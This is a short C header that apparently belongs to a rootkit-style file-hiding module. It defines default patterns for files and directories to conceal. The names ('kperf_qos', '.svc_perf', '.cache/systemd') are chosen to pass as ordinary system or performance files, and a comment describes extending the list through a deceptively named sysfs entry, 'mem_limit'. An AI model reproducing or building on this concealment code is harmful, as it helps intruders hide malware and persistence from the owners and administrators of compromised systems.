#ifndef BAT_HIDING_FILES_DEF_H
#define BAT_HIDING_FILES_DEF_H

/* Default file/dir patterns to hide   extend via sysfs mem_limit */
static const char *hidden_patterns[] = {
    "kperf_qos",
    ".svc_perf",
    ".cache/systemd",
    NULL
};

#endif /* BAT_HIDING_FILES_DEF_H */
